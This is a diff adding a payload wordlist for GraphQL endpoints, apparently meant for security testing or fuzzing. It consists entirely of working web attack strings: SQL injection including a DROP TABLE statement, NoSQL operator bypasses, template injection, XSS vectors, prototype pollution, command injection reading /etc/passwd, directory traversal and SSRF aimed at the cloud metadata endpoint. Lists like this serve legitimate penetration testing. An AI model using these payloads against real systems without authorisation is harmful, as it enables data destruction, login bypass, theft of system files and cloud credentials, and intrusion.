@@ -1,0 +1,56 @@
+# GraphQL Injection Payloads
+
+# SQL Injection via GraphQL
+' OR '1'='1
+' OR '1'='1' --
+1; DROP TABLE users--
+1 UNION SELECT 1,2,3--
+1' AND '1'='1
+1' AND SLEEP(5)--
+1' ORDER BY 1--
+
+# NoSQL Injection via GraphQL
+{"$gt": ""}
+{"$ne": null}
+{"$where": "1==1"}
+{"$regex": ".*"}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+
+# Template Injection
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{{'a'.constructor.prototype.polluted = 'yes'}}
+{{constructor.constructor('return this')()}}
+
+# XSS Payloads
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+"><script>alert(1)</script>
+'-alert(1)-'
+
+# Prototype Pollution
+{"__proto__": {"admin": true}}
+{"constructor": {"prototype": {"admin": true}}}
+{"__proto__": {"polluted": "yes"}}
+
+# Command Injection
+; ls -la
+| cat /etc/passwd
+`id`
+$(id)
+; sleep 5
+| sleep 5
+
+# Directory Traversal
+../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+
+# SSRF
+http://127.0.0.1/
+http://localhost/
+http://169.254.169.254/latest/meta-data/
